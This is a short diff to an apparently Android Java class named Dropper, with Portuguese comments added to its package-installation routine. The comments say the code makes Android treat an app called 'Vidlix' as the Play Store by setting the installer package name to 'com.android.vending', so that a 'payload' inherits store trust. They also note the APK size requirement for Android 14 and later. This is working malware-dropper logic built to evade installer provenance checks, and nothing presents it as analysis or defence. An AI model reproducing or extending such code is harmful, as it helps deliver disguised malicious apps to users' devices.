@@ -168,10 +168,13 @@ public class Dropper {
         PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                 PackageInstaller.SessionParams.MODE_FULL_INSTALL);
 
+        // 1. Força o Android a tratar o Vidlix como a Play Store.
+        //    Isto é o que permite ao payload herdar a confiança de loja.
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             params.setInstallerPackageName("com.android.vending");
         }
 
+        // 2. Define o tamanho do APK (obrigatório no Android 14+ para evitar falhas silenciosas).
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             params.setSize(apk.length());
         }
@@ -199,4 +202,4 @@ public class Dropper {
         s.commit(pending.getIntentSender());
         s.close();
     }
-            }
+    }
